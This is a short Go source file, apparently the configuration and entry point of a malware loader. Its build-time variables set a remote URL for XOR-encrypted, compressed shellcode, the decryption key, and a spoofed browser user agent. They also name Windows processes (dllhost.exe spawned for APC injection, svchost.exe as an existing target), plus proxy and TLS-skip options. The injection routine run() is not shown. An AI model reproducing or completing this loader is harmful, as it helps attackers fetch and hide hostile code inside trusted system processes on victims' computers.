package main

// Embedded at build time via -X ldflags.
var (
	PayloadURL      = "" // URL to XOR-encrypted, zlib-compressed shellcode
	XORKey          = "" // 4-byte key as 8 hex chars, e.g. "deadbeef"
	UserAgent       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	SacrificialProc = `C:\Windows\System32\dllhost.exe` // spawned + injected (APC); "" = skip
	InjectExisting  = "svchost.exe"                      // try running process first; "" = skip
	ProxyURL        = ""      // "http://proxy:8080" or "" — routes fetch() through HTTP CONNECT proxy
	TLSSkipVerify   = "false" // "true" to skip TLS certificate verification for https:// URLs
)

func main() { run() }
